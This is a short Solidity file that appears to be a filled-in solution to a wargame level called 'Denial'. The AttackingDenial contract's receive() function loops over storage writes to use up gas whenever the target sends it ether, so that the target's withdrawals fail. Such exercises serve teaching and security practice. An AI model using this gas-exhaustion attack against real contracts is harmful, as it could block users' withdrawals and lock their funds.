// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;
    uint256 private awfulCounter = 0;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    //Code me!
    receive() external payable {
        uint256 i;
        for (i = 1; i < 100; i++) {
            awfulCounter = i;
        }
    }
}
